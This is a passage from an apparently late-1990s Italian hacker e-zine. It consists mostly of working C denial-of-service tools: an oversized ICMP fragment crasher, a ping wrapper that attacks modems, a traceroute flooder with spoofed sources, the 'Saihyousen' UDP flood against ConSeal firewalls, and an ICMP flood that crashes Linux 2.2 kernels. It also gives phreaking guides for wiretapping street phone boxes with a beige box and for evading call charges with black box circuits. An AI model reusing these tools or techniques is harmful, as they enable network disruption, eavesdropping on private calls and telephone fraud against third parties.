	dst.sin_addr = ip->ip_dst;
	dst.sin_family = AF_INET;
               /*decide il tipo di icmp da mandare*/
	icmp->type = ICMP_ECHO;
	icmp->code = 0;
	icmp->checksum = htons(~(ICMP_ECHO << 8));
            /*manda pacchetti fino a quando la lunghezza e' maggiore a 65536*/
	for (offset = 0; offset < 65536; offset += (sizeof buf - sizeof *ip)) {
		ip->ip_off = htons(offset >> 3);
		if (offset < 65120)
			ip->ip_off |= htons(0x2000);
		else
			ip->ip_len = htons(418);  /* in totale ne costruisce 65538 */
		if (sendto(s, buf, sizeof buf, 0, (struct sockaddr *)&dst,
					sizeof dst) < 0) {
			fprintf(stderr, "offset %d: ", offset);
			perror("sendto");
		}
		if (offset == 0) {
			icmp->type = 0;
			icmp->code = 0;
			icmp->checksum = 0;
		}
	}
	close(s);
	usleep(30000);
    }
	return 0;
}

Come avrete capito non e' molto difficile intuire cio' che fa sto codice.
Utilizza i sock_raw, per autocostruirsi i pacchetti, e manda un echo request
modificato in modo da far bloccare il winzozz. Credo che abbiate capito,
altrimenti vi rimando a fare una ricerca su internet riguardo ai socket.

##############################################################################

              /\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
             |   Ping: macchina da guerra   |
              \/\/\/\/\/\/\/\/\/\/\/\/\/\/\/

Sapete cosa fa il ping???

Il Ping usa il protocollo ICMP per mandare degli ECHO_REQUEST per avere da
parte del server una ICMP ECHO_RESPONSE . I datagrammi ECHO_REQUEST(``pings'')
hanno un IP e un ICMP header, seguiti da ``struct timeval'' e poi un numero
arbitrario di bytes ``pad''  usati per spedire i pacchetti.
Sono possibili le seguenti opzioni:

     -c count
            Si ferma dopo aver mandato (e ricevuto) i pacchetti ECHO_RESPONSE.

     -d     Setta l'opzione SO_DEBUG sul socket che sta per essere usato.

     -f     Flood ping. Manda pacchetti molto velocemente fino al loro ritorno
            o cento volte al secondo.  Per ogni ECHO_REQUEST spedito
            sono stampati un gruppo di ``.'' , mentre per tutti gli
            ECHO_REPLY ricevuti stampa uno spazio.  Questo provvede
            a dimostrarti quanti pacchetti sono stati mandati.
            Attenzione, questa opzione puo' essere usata solo dal root perche'
            puo' causare delle difficolta' su un server ed e' stata creata
            con lo scopo di testare le proprie reti, ma in realta' a noi
            quello frega poco .

     -i wait
            Aspetta dei secondi prima di continuare..Il default e' un secondo
            tra ogni pacchetto, ed e' icompatibile con l'opzione -f

     -l preload
            Se specificate questa opzione, il ping manda molti pacchetti
            piu' veloci possibili prima di comportarsi normalmente.
            Anche quest'opzione puo' essere usata solo dal root, ma a noi non 
            frega proprio, vero?

     -n     Uscita solo numerica.

     -p pattern
            Qui dovrai specificare un numero esadecimale di due cifre, 
            che saranno i bytes che riempiranno il pacchetto da spedire. 
            Questa opzione e' molto utile per diagnosticare problemi 
            dipendenti da dati su un server. Per esempio, ``-p ff''
            causera' la spedizione del pacchetto da essere riempito con tutti.

     -q     Non stampa niente, eccetto la linea di sommario all'inizio e 
            quando finisce.

     -R     Registra la rotta. Include l'opzione RECORD_ROUTE nel pacchetto
            ECHO_REQUEST e mostra il buffer della rotta al ritorno dei 
            pacchetti. Molti hosts ignorano questa opzione.

     -r     Bypassa la tabella del routing e manda direttamente all'host
            sul server voluto. Se l'host non puo' essere direttamente colpito
            compare un errore.

     -s packetsize
            Specifica il numero dei bytes da spedire.  Il default e'
            56, che traduce dentro i 64 bytes di dati ICMP quando e' unito
            agli 8 bytes dell'header ICMP.

     -v     Tutti i pacchetti ricevuti vengono mostrati.

Bene, bene, credo che tutti avrete ben capito le funzioni del ping e le sue 
potenzialita'. Vogliamo crarci un bel DOS che mandi un carattere illegale
ad un modem??? Ok, per prima cosa vi dico che tutti noi abbiamo settato
delle proprieta' del modem:
bit di parita', bit di trasmissione, ecc e che queste proprieta' fanno parte 
del protocollo PPP. Ora se noi mandiamo un bit errato il modem non
l'accettera' e causera' qualcosina di malizioso alla sventurato. Ihih,
tutto questo e' possibile con PING, usando le opzioni -s e -p . L'opzione
-s , come abbiamo gia' visto serve per specificare la grandezza del pacchetto,
ora visto che un pacchetto ICMP e' formato da 64 bit di cui 8 sono l'header, 
voi direte che dovrete specificarne 56?? Beh, lo potete fare solo che
avrete un pacchetto icmp regolare e noi questo non lo vogliamo, vero?
Ihihihih! L'opzione -p serve per specificare il carattere da sendare che
puo' andare da 16 a FF. Vi consiglio 7d o 7e visto che sono dei caratteri
ireggolari non ben accetti al modem. Iniziamo a costruirci il nostro bel 
programmino:

Prima cosa dovremo specificare l'include che conterra' tutte le funzioni
per la gestione dei processi. Infatti se ci sara' stato un errore,
l'istruzione SIGALRM ve lo comunichera'. 

#include <signal.h>

Seconda cosa dovremo specificare il path dove e' contenuto il ping:


#define PING "/bin/ping"

Iniziamo con il main, dove dovremo passargli come parametri il numero degli
argomenti e gli argomenti (ovvero tutte i dati che ci consentono la spedizione)

main( int argc, char *argv[] )
 {
  int permessi;
  /*Se non sono stati passati tutti gli argomenti stampa il menu' */
  if (argc < 3) {
                 printf (" Killit by Urkes ");
                 printf("uso: %s <host> <grandezza> <carattere illegale>\\n", argv[0]);
                 exit(0);
                }
  /* Controlla se i permessi sono validi, visto che l'opzione -p */
  /* richiede di essere root */
  if(!(permessi = fork()))
  execl(PING, "ping", argv[1], "-s", argv[2], "-p", argv[3]);
  if ( permessi <=0 ) {
                       printf("I permessi non sono validi\\n");
                       exit(1);
                      }
  sleep (1); /* passa un secondo prima di continuare */
  while (1)
  if ( kill(permessi, SIGALRM) )
  exit(1);
}

Questo prog e' veramente semplice sia da fare che da utilizzare.
Ma se date sfogo alla vostra fantasia potrete creare dei veri e propri
ICMP flooder o, come ho fatto io, potete modificare il sorgente del ping
eliminandoci le opzioni stupide e personalizzando quelle utili facendole
diventare piu' da war! Per ora e' tutto, mi raccomando aprite gli occhi ;D

##############################################################################

                 /\  /\  /\  /\  /\  /\
                /--\/--\/--\/--\/--\/--\
               (|TRACEROUTE COME FLOODER)
                \__/\__/\__/\__/\__/\__/
                 \/  \/  \/  \/  \/  \/  

Due bug di traceroute permettono all'utente di usare traceroute come
un piccolo udp flooder, o (solo dalla versione 1.4) anche come icmp flooder

E' stato testato sulle maggiori distribuzioni di linux e su alpha unix,
e, la maggior parte delle volte, l'esito e' stato positivo.

-primo bug-
valore di waittime
sistemi affetti: linux e alpha unix
traceroute non tratta molti argomenti con valori alti con l'opzione -w .
il valore del limite non sembra rimanere costante, ma mai e' piu' grande di
(1<<31)-1 o su altri fronti ((1<<(sizeof(int)*8)-1)-1) su sistemi
gia' testati dove la grandezza di int e' 4.
Il problema consiste nel settare il valore di waittime 
(waittime = str2val(optarg, "wait time",2,-1);), usato in wait_for_reply
per attendere una risposta.
allora passando un valore alto all'opzione -w traceroute non attendera' 
per i pacchetti di ritorno.


-second bug-
-s (l'indirizzo sorgente da cui vengono inviati i pacchetti)
sistemi affetti: linux (anche altri)
Di solito traceroute controlla se l'indirizzo sorgente da cui vengono inviati
i pacchetti corrisponde ad uno degli indirizzi in cui ci si trova;
nel caso in cui non corrisponde, appare un errore e non viene inviato nulla.
sui linux traceroute fallisce questo controllo.
in questo caso ognuno puo' mandare pacchetti che provengono da un indirizzo
falso (spoffato) e non ricevera' risposte dai pacchetti
(TIME_EXCEEDED o PORT_UNREACHABLE ed anche unexpected packets)


considerando il massimo numero di pacchetti che traceroute puo' inviare,
il numero di pacchetti per secondo ricevuti dall'host target,
il minimo pacchetto ICMP usato da traceroute,
possiamo realizzare un vero flooder udp/icmp usando traceroute,
avremmo sicuramente un buon flooder visto le potenzialita' e
nessuno puo' realizzare un vero DOS contro la vittima;
comunque basta settare il numero delle query (-q), la grandezza dei pacchetti,
e se vogliamo, anche il time-to-live dal primo pacchetto spedito.

(non non siamo usanso traceroute per tener traccia della rotta seguita
da un pacchetto ma stiamo tentando di floodare,
se conosciamo la topologia della rete tra noi e l'obbiettivo
e possiamo settare il time-to-live dal primo pachetto conoscendo la distanza.)

Se vuoi usare `traceroute -w $(((1<<31)-1)) -q 8 -f n
-s xxx.xxx.xxx.xxx target 1460' o se vuoi tentare di sapere il valore
del waittime , qui di seguito e' riportato il codice per sfruttare questi bug.
Questo codice e' stato realizzato da Alfonso De Gregorio, colui che ha
scoperto i bug, ed e' presentato nella sua forma originale.

--Taglia qui--
/*

   tracerouteflood.c by (fhex) Alfonso De Gregorio <fhex@speedcom.it>
   a special thanks to: my sister :)
                        Davide (buzzz) Bozzelli a great friend that let
                        me use his alpha
                        Salvatore (antirez) Sanfilippo and Lorenzo (gigi_sull)
                        Cavallaro two  friend always
                        available to pay attantion to my nonsenses
                        and take me great advices


   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; version 2 of the License.

   -------------------------------------------------------------------------

   WARNING: this program is only for dimostrative use. USE IT AT YOUR
            OWN RISK! The autors decline responsability caused by
            bad or malicious use.

   to compile: gcc -O2 tracerouteflood.c -o tracerouteflood
   (should copile succesfully on Debian, Slackware, RedHat, DigitalUnix etc.)


                                                alfonso de gregorio
   -------------------------------------------------------------------------
        
*/

#include<stdio.h>
#include<unistd.h>
#include<sys/types.h>
#include<sys/wait.h>
#include<string.h>



#define TRACEROUTE "/usr/sbin/traceroute"      /* traceroute's pathname  */
#define MAX_LENGHT      12                    /* buffer dimension   */



int
usage(char *argo)
{
  printf("usage: %s: %s [-I] [-f first_ttl] [-q nqueries] [-s source_ip] hostname [packetlen]\n",argo,argo);
  printf("\t -I\t\tflood using ICMP ECHO instead of UDP datagrams.\n");
  printf("\t -f firt_ttl\tthe initial time-to-live used in the first outgoing packet\n");
  printf("\t -q nqueries\tqueries number\n");
  printf("\t -s source_ip\tthis ip is the address of the outgoing packets\n");
  printf("\n\t(-I and -f switches works only with traceroute 1.4 or higher)\n");
  printf("\t[source_ip] can be arbitrary only on linux\n");
  printf("\n\tFor example:./tracerouteflood -I -f 2 -q 8 -s xxx.xxx.xxx.xxx dest.somewhere.com 1460\n");

return 1;
}



int
main(int argc, char **argv )
{
        char            badwait[MAX_LENGHT];
        pid_t           pid_traceroute;
        register int    op;
        int             i,j;

        char *cmdline[10]={};

        if (argc < 2 || argc > 10 ) exit(usage(argv[0]));


#ifdef __alpha__
/* an integer overflow */
/* please, if ((1<<(sizeof(int)*8)-1)-1) isn't enought on your system */
/* repleace it  with just a big number (don't forget to mail me :) */

        sprintf(badwait,"%ld",((1<<(sizeof(int)*8)-1)-1)  );
#else
        snprintf(badwait,MAX_LENGHT,"%ld",((1<<(sizeof(int)*8)-1)-1)  );
#endif



        opterr=0;
        while ((op = getopt(argc, argv, "If:q:s:")) != EOF)
                switch (op) {
                
                case  'I':
                        cmdline[1]=argv[optind-1];
                        break;
                case  'f':
                        cmdline[2]=argv[optind-2];
                        cmdline[3]=argv[optind-1];
                        break;
                case  'q':
                        cmdline[4]=argv[optind-2];
                        cmdline[5]=argv[optind-1];
                        break;
                case  's':

/* if you have noticed -s bug also on other systems then linux let free to add */
/* here the symbol for the preprocessor (and don't forget to mail me:) */

                        #ifdef __linux__
                                cmdline[6]=argv[optind-2];
                                cmdline[7]=argv[optind-1];
                        #else
                                printf("since now this bug appeare to be present only on linux\n");
                                exit(1);
                        #endif
                        break;
                default:
                        exit(usage(argv[0]));
                        break;
                }



        switch (argc - optind) {

        case 1:
                cmdline[8]=argv[optind];
                break;
        case 2:
                cmdline[8]=argv[optind];
                cmdline[9]=argv[optind+1];
                break;
        default:
                exit(usage(argv[0]));
        }




        for (i=1;i<9;i++){
                if (cmdline[i] == NULL && cmdline[i+1] != NULL) {
                        for(j=i;j<9;j++){
                                cmdline[j]=cmdline[j+1];
                                cmdline[j+1]=(char *) NULL;
                        }
                i=0;
                }
        }                       


        pid_traceroute = fork();
        if ( pid_traceroute == 0) {
        
execl(TRACEROUTE,"traceroute","-w",badwait,cmdline[1],cmdline[2],cmdline[3],cmdline[4],cmdline[5],cmdline[6],cmdline[7],cmdline[8],cmdline[9],NULL);
                perror("exec: maybe traceroute is not in pre-arranged directory");
                exit(1);
        }


        if ( waitpid(pid_traceroute, NULL, 0) < 0) {
                printf("wait error\n");
                exit(1);
                }

        
        printf("done\n");
        exit(0);
}

--Fine-- 

Spero di esservi stato d'aiuto e che abbiate capito il funzionamento,
Non fa altro che usare il traceroute con le opzioni che abbiamo visto prima.
E questo e' gia' il secondo metodo di realizzare un flooder (ping,traceroute),
utilizzando i tools che ci regala linux! Comunque se vorreste realizzarne
uno anche voi (dovrete sapere il linguaggio C) fatelo!, iniziando a vedere
i sorgenti dei tools che usiamo quotidianamente con linux!

##############################################################################

        |||||||||||||||||||||||||||||||||||
           CONSEAL: RULES E DESTRUCTION
        |||||||||||||||||||||||||||||||||||
        |||||||||||||||||||||||||| ___  __
        |||||||||||||||||||||||||||___ |__| 
        |||||||||||||||||||||||||| ___| __|
                                         

Quanti di voi vorrebbero configurare seriamente il conseal, solo che
non ci sono mai riusciti??? Chi di voi vuole nukkare ma non vuole essere
nukkato?

Ebbene, ora vi mostrero' come settare i rules nel modo che piu' vi garba.
Prima cosa aprite il conseal e cliccate su rules.
Poi andate su All Network Devices, e qui vi dovrebbe mostrare tutti i servizi
da bloccare(block) o lasciare(allow). Vi siete mai chiesti a che servono
quelle piccole lettere I e O ???
I sta per Inbound ed indica le connessioni in entrata.
O sta per Outbound ed indica le connessioni in uscita.
Se volete far partire un nuke alla porta 139 ma allo stesso tempo,
volete bloccare le connessioni in entrata alla vostra porta 139, basta
che selezionate Block, poi Inbound, poi aggiungete un nuovo servizio
e selezionate Allow, poi Outbound. Esempio:
In all network devices cliccate su Add, poi su next. Scegliete un
servizio qualsiasi basta che sia TCP/IP e come protocollo scegliete
appunto TCP/IP. Ora selezionate solo Inbound e cliccate su block.
Andate avanti e mettete in local ports  139 TO 139  , mentre in remote ports
selezionate un range oppure tutte le porte.Ora cliccate su next ed infine end.
Ora bloccate tutte le connessioni alla porta 139 in entrata.
Vediamo come fare per lasciare quelle in uscita.
Cliccate nuovamente su Add, poi su next.
Selezionate un servizio qualsiasi basta che sia TCP/IP e come protocollo
selezionate appunto il TCP/IP.Ora selezionae solo Outbound e lasciate solo
Allow. Andate avanti e in local port mettete un range di porte o tutte, mentre
in remote port inserite 139 to 139. Cliccate su next ed infine end.
In questo modo avete configurato il conseal in modo che vi permetta di
attaccare alla porta 139. Ora se avete capito il metodo lo potete fare con
qualsiasi porta e/o servizio. Avevo pensato di realizzare un rules gia' pronto
all'uso, solo che ho capito che le persone lo utilizeranno sensa capire in che
modo funzioni, e cosi' ho deciso di spiegarvelo.

Ora passiamo dal lato malefico, ovvero come sfruttare un bug del Conseal che
ha abilitato il learning mode. Il learning mode e' una funzione del conseal
che permette di far scegliere all'utente il destino di pacchetti non
identificati nel rules. Se una persona aprira' tante connessioni sfruttando
ogni volta una porta diversa e cambiando ogni volta l'IP, con l'host che ha
il conseal con il learning mode abilitato, quest'ultimo andra' in crash visto
che non riuscira' piu' a contenere il numero delle connessioni tentate e dei
nuovi rules scritti di volta in volta . Ma anche se e' abilitato il log mode,
cioe' la memorizzazione di tutte le connessioni ricevute ed effettuate, il
conseal crashera'. Vediamo il bug realizzato in C e funzionante da linux:

----Taglia Qui----

#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in_systm.h>
#include<netinet/in.h>
#include<netinet/ip.h>
#include<netinet/udp.h>
#include<errno.h>
#include<strings.h>
#include<netdb.h>
#include <stdlib.h>
#include<stdio.h>
#ifdef BROKEN_LIBC
#include <arpa/inet.h>
#else
#define u_char unsigned char
#define u_short unsigned short
#endif

struct sockaddr sa;

int main(int argc,char **argv)
{
int fd;
int x=1;
int hosti=192;
int hostii=168;
int hostiii=1;
int meep=0;
int fooport=1;
int numpack=0;
char funhost[15];
struct sockaddr_in *p;
struct hostent *he;
u_char gram[36]=
{
0x45, 0x00, 0x00, 0x26,
0x12, 0x34, 0x00, 0x00,
0xFF, 0x11, 0, 0,
0, 0, 0, 0,
0, 0, 0, 0,

0, 0, 0, 0,
0x00, 0x12, 0x00, 0x00,

'3','1','3','3','7','8','9','0'
};

if(argc!=3)
{
fprintf(stderr,"Saihyousen, by Noc-Wage\n");
fprintf(stderr,"The faster your connection to the internet is (latency
wise, not bandwidth)\n");
fprintf(stderr,"and the lower the CPU speed of the victim
will\nincrease probability of success\n");
fprintf(stderr,"usage: %s victim num_of_packets Ex: saihyousen
127.0.0.1 40000\n",*argv);
exit(1);
};
if((fd=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))== -1)
{
perror("requires RAW SOCKETS");
exit(1);
};

#ifdef IP_HDRINCL
if (setsockopt(fd,IPPROTO_IP,IP_HDRINCL,(char*)&x,sizeof(x))<0)
{
perror("setsockopt IP_HDRINCL");
exit(1);
};
#else
fprintf(stderr,"we don't have IP_HDRINCL :-(\n\n");
#endif

/* The stuff below is so that it's not fully sequential  i.e
100.100.100.101, 100.100.100.102  */
for (numpack=0;numpack<=atoi(argv[2]);numpack++) {
if (meep==0) { ++hosti; meep++; }
if (hosti>254) hosti=1;
if (meep==1) { ++hostii; meep++;}
if (hostii>254) hostii=1;
if (meep==2) { ++hostiii; meep=0;}
if (hostiii>254) hostiii=1;

sprintf( funhost, "%i.%i.%i.%i",hosti,hostii,hostiii,hosti);
(he=gethostbyname(funhost));
bcopy(*(he->h_addr_list),(gram+12),4);

if((he=gethostbyname(argv[1]))==NULL)
{
fprintf(stderr,"can't resolve destination hostname\n");
exit(1);
};
bcopy(*(he->h_addr_list),(gram+16),4);
fooport++;
/* resets the port to 1 if it's nearing the end of possible values */
if (fooport>65530) {fooport=1;};
*(u_short*)(gram+20)=htons((u_short)fooport);
*(u_short*)(gram+22)=htons((u_short)fooport);

p=(struct sockaddr_in*)&sa;
p->sin_family=AF_INET;
bcopy(*(he->h_addr_list),&(p->sin_addr),sizeof(struct in_addr));

if((sendto(fd,&gram,sizeof(gram),0,(struct sockaddr*)p,sizeof(struct
sockaddr)))== -1)
{
perror("sendto");
exit(1);
};
/* printf("Packet # %i\n", numpack); */
/* Turn that on to see where you are.. it'll slow the attack though */
};
printf("Attack against %s finished", argv[1]);
putchar('\n');
return 1;
}

----Fine----

Per proteggervi, da come avrete intuito, basta che disabilitiate il learning
mode e il logging mode. Ma se andate sul sito www.signal9.com dovreste
trovare la patch che rimedia a questo bug. Eheh, ho accontentato sia gli
ircwar sia quelli che hanno bisogno di una buona protezione. :))

##############################################################################

          DoS-DoS-DoS-DoS-DoS-DoS-DoS-DoS
           -      DoS X KERNEL 2.2     -
          DoS-DoS-DoS-DoS-DoS-DoS-DoS-DoS

Aglia, purtroppo e' vero! Ieri ho installato il kernel 2.2.9
ed e' gia' uscito un bug! Questo bug e' stato provato su kernel
2.2.7 e 2.2.9 ma si dice che funziona con i kernel di generazione 2.2
Il kernel crasha quando si tenta di mandargli un grande numero di ICMP
specifici. Purtroppo non e' una bella notizia per noi linuzziani,
penso che su kernel.org potrete trovare la patch. Questo qui di seguito
e' il DoS, ed e' solo per linux.

-=-=-=-=Taglia Qui=-=-=-=-

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <errno.h>
#include <unistd.h>
#include <netdb.h>

struct icmp_hdr
{
    struct iphdr iph;
    struct icmp icp;
    char text[1002];
} icmph;

int in_cksum(int *ptr, int nbytes)
{
    long sum;
    u_short oddbyte, answer;
    sum = 0;
    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1)
    {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return(answer);
}

struct sockaddr_in sock_open(char *address, int socket, int prt)
{
        struct hostent *host;
        if ((host = gethostbyname(address)) == NULL)
        {
                perror("Unable to get host name");
                exit(-1);
        }       
        struct sockaddr_in sin;
        bzero((char *)&sin, sizeof(sin));
        sin.sin_family = PF_INET;
        sin.sin_port = htons(prt);
        bcopy(host->h_addr, (char *)&sin.sin_addr, host->h_length);
        return(sin);
}

void main(int argc, char **argv)
{
        int sock, i, ctr, k;
        int on = 1;
        struct sockaddr_in addrs;
        if (argc < 3)
        {
                printf("Usage: %s <ip_addr> <port>\n", argv[0]);
                exit(-1);
        }
        for (i = 0; i < 1002; i++)
        {
            icmph.text[i] = random() % 255;
        }
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) == -1)
        {
            perror("Can't set IP_HDRINCL option on socket");
        }
        if (sock < 0)
        {
            exit(-1);
        }
        fflush(stdout);
        for (ctr = 0;ctr < 1001;ctr++)
        {
            ctr = ctr % 1000;
            addrs = sock_open(argv[1], sock, atoi(argv[2]));
            icmph.iph.version = 4;
            icmph.iph.ihl = 6;
            icmph.iph.tot_len = 1024;
            icmph.iph.id = htons(0x001);
            icmph.iph.ttl = 255;
            icmph.iph.protocol = IPPROTO_ICMP;
            icmph.iph.saddr = ((random() % 255) * 255 * 255 * 255) +
            ((random() % 255) * 65535) +
            ((random() % 255) * 255) +
            (random() % 255);
            icmph.iph.daddr = addrs.sin_addr.s_addr;
            icmph.iph.frag_off = htons(0);
            icmph.icp.icmp_type = random() % 14;
            icmph.icp.icmp_code = random() % 10;
            icmph.icp.icmp_cksum = 0;
            icmph.icp.icmp_id = 2650;
            icmph.icp.icmp_seq = random() % 255;
            icmph.icp.icmp_cksum = in_cksum((int *)&icmph.icp, 1024);
            if (sendto(sock, &icmph, 1024, 0, (struct sockaddr *)&addrs, sizeof(struct sockaddr)) == -1)
            {
                if (errno != ENOBUFS) printf("X");
            }
            if (ctr == 0) printf("b00m ");
            fflush(stdout);
        }
        close(sock);
}

-=-=-=-=Fine=-=-=-=-

Questo bug e' uscito il 2 giugno, ed il giorno prima ho installato il
kernel 2.2.9! Fate una cosa o vi scaricate la patch, o il kernel 2.3.0
Questo e' tutto!
##############################################################################

                 (----------------------------)
                  Boxaggio: tutti i colori (1)
                 (----------------------------)
                                    
In questo articolo vi daro' info riguardo tutti i tipi di box che vengono
usati nel mondo. La costruzione, gli usi, i rischi.
Sta a voi costruirli e vedere se almeno uno funziona nella nostra nazione.
Altrimenti prendetela come una lezione di phreaking, teoria da approfondire
per gli smanettoni.
In questo articoli vedrete le prime 4 box.
Iniziamo.

--------Beige box--------

------------
INTRODUZIONE
------------
        
La beige box non e' altro che un controlla linea. 
Il nome deriva dal colore della prima box creata dagli inventori(mah).
Ora vi spiego come si costruisce.
 
-----------
COSTRUZIONE
-----------
 
La costruzione e' veramente semplice. Per primo, dovete conoscere
il concetto della periferica. In un jack modulare, ci sono quattro fili.
Questi sono rosso, verde, giallo, e nero.  Per una singola linea telefonica,
comunque, solo due servono: il rosso (squillo) e il verde (tip).  Il giallo e
il nero non sono necessari per questo progetto. La beige box ha bisogno solo
di queste due cose: il ring e il tip.  
 
Hai bisogno di un telefono (raccomando uno a toni analogici) con un una spina  
modulare, un jack modulare, e due prese ad alligatore (preferibilmente
rosso e verde, rispettivamente).  Prendi il jack modulare e guarda
all'inizio del suo coperchio .  Dovrebbe esserci un jack grigio con
quattro fili (rosso, verde, giallo, e nero) conducili fuori da esso.
Alla fine del filo rosso attaccaci la prese ad alligatore rossa.
Alla fine del filo verde attaccaci la presa ad alligatore verde.
I fili gialli e neri possono essere rimossi, ma se vuoi puoi rimanerli
per i tuoi futuri progetti.  Ora inserisci la presa modulare del tuo telefono
nello jack modulare.  Ecco tutto!      
 
Questo modello particolare e' veramente facile da costruire,
non e' costoso, e'facile ricavare i pezzi , e' piccolo,
e non richiede la distruzione del telefono 
 
----- ---- ---
BEIGE BOX: USI
----- ---- ---

Ci sono molti usi per la Beige Box. Comunque, prima di usarla,
dovete conoscere come attaccarla ad una delle tante scatole telefoniche
che si trovano per la strada.
Questa scatola puo' essere ogni tipo di apparato di suoneria che include 
un terminale .
Per aprire la maggior parte delle scatole, dovrete procurarvi
un conduttore hex di 7/16 pollici. Questo pezzo potete trovarlo nel negozio
di elettronica piu' vicino a voi.  Con il vostro conduttore hex 7/16 ,
girate i catenacci di sicurezza di 1/8 di un police in senso orario e 
aprite. Se la scatola e' bloccata, dovrete avere un po' di 
conoscenza nel distruggerla. Comunque, noi non abbiamo mai incontrato
una scatola bloccata. Una volta aperta, dovreste vedere un insieme di fili
connessi ad un terminale. Su molte scatole, il terminale si chiamera' "T"
(Tip -- se non e' scritto, di solito si trova sulla sinistra)
e "R" (Ring -- se non e' scritto, di solito si trova sulla destra).
Ricorda: Ring - rosso -  destra.
 
Ora dovrai attaccare la presa ad alligatore rosso (ring) al terminale 
"R" (ring). Attacca la presa ad alligatore verde (tip) al terminale 
"T" (tip).  NOTA: Se schiacciando i tasti non senti niente,
ri aggiusta le prese ad alligatore in modo che non tocchino ogni altro
terminale. Inoltre assicurati che siano ben attaccati.
 
        Qui ci sono alcune applicazioni pratiche:
                o  Ascoltare le telefonate
                o  Telefonate ai propri amici
                o  Blue Boxing con una grande chance di ridurre la possibilta'
                   che ti sgamino     
                o  Qualsiasi altra cosa! 
Acoltare:
---------
 
Per essere effettivo, prima attacca la Beige Box poi il tuo telefono 
Questo eliminera' i problemi di elettricita' statica causata dalla
connessione della box, riducendo i pericoli anche per la tua vittima.
Quando origli, e' sempre meglio non essere visti. Se ascolti qualcuno
che telefona, non aver paura; ma piuttosto spegni, aspetta , e rialza
La persona attacchera' anch'essa la cornetta o provera' a finire la 
conversazione.  Se riprovera', ascoltalo, e ricaverai molte informazioni 
Se volete sapere chi state ascoltando , dopo aver chiamato, trattenete
un CN/A sul numero.
 
 
Chiamare gli amici
-------- --- -----
 
Non credo che avete bisogno di molte info a riguardo,
ma non dimenticatevi di premere "1" prima del numero.
 
                                                                                 
Blue Boxing:
---- ------
 
Se userai il metodo della Blue Box, sara' molto utile per non essere
tracciato.
 
 
------ ---------- --- ----- ------
RISCHI POTENZIALI DEL BEIGE BOXING
------ ---------- --- ----- ------
 
Vi raccomando di seguire i miei consigli perche' la Beige Box porta
dei pericoli.

        o  Usa piu' di una scatola
        o  Scegli un posto appartato
        o  Per essere sicuri che non si venga scoperti raccomando
           di piazzare un pezzo di nastro trasparente sopra le aperture 
           della vostra scatola. In modo che se qualcuno apre la scatola,
           in vostra assenza, lo saprai subito.
 
 
--------Black Box---------


Cos'e' una Black Box? Una BLACK BOX e' una periferica che si inserisce sopra
il tuo telefono e lo aggiusta anche quando ricevi una chiamata,
al chiamante non verra' addebitato nulla.
Questo e' buono solo per chiamate fino alla mezz'ora,  dopo mezz'ora
le compagnie telefoniche si possono insospettire.

Come lavora:

Questo piccolo aggeggio fa mantenere il voltaggio della linea dalla caduta
a 10v  quando rispondi al telefono. La linea e' invece mantenuta a 36v e
essa fara' in modo che il telefono pensera' che sta squillando ancora
mentre tu parli.
La reazione per mezz'ora e' che la compagnia non si accorgera' di nulla,
mentre oltre la mezz'ora capira' che c'e' qualcosa che non va.

Tutti le parti si possono trovare in un qualsiasi negozio di elettronica.
Comprando tutte le parti, il costo e' di circa 1500 lire!
E questo e' il costo di due di loro! E' veramente un affare!  Se vuoi
esagerare puoi procurarti un interfaccia con il pc e un interrutore.
Ci sono due schemi per questa box, uno e' per i telefoni comuni.
Il secondo serve per quei telefoni che non funzionano con il primo. 
E' stato progettato per usarlo con un telefono touch tone.

  **  Primo schema per i telefoni comuni  **
  **           LED ON: BOX ON             **

DA    >---------------------VERDE->  A
LINEA >--!   1.8k  LED  !---ROSSO->  TEL.
         !--/\/\/\--!>--!
         !              !
         ------>/<-------
               SPST

Parti:  1 resistore 1.8k di 1/2 watt 
        1 LED  di 1.5v
        1 interrutore SPST 

Dovrai solo avere due fili che connetterai insieme all'interrutore.


  **  Secondo schema per tutti i telefoni  **
  **           LED ON: BOX OFF             **

DA    >----------------VERDE->  A
LINEA >-------      ---ROSSO->  TEL.
             !  LED !
           -->/<--!>--
           !         !
           ---/\/\/---
              1.8k

Parts:  1 resistore 1.8k di 1/2 watt 
        1 LED di 1.5v
        1 interrutore DPST 


Ecco l'interfaccia con il PC che vi raccomando.  E' molto semplice
da costruire e da applicare.

   #1 Schema               #2 Schema

  **************           ****************
  *            *           *  -------     *
  * --<LED>--- *           *  !     !     *
  * !        ! *           *  ! <SWITCH>  *
  * RESISTOR ! *           *  ! !      !  *
  *        ! ! *           *  ! !      /  *
  * -------- ! *           *  ! !      \  *
  * !        ! *           *  ! <LED>! /  *
  * --SWITCH-- *           *  !      ! \  *
L *  !      !  *         L *  !      ! /  *
I *  !      !  *         I *  !      ! !  * 
N>RED-      -RED>T       N>RED-      ---RED>T
E>-----GREEN---->E       E>-----GREEN------>E
A * h          * L.      A *              * L.
  **************           ****************


Una volta agganciate tutte le parti,  devi vedere quali sono i fili che vanno
alla linee e quali vanno al telefono.   Questo perche' in effetti il LED
deve essere inserito, in una certa direzione.  Dipende in quale lato
inserisci il LED che controlla quali sono i fili per la linea & telefono.

Come trovarlo:

Aggancia la box in una direzione usando un set di fili per linea e l'altra
per il telefono.

*NOTA*  Per il modello I l'interrutore dovra' stare su OFF.
*NOTA*  Per il modello II l'interrutore dovra' essere settato sul lato
        dove e' connesso il led.

Una volta agganciata, alza la cornetta(Mondial casa ti aspetta!)
e vedi se il LED si accende.  Se non si accendera' sposta i fili e riprova.
Una volta che conosci quali sono i cavi, segnali.
*NOTA*  - Se nessuna direzione funzionera' significa che il tuo interrutore
e' inserita in una posizione scorretta. Prova a cambiare posizione.

Come usarla:

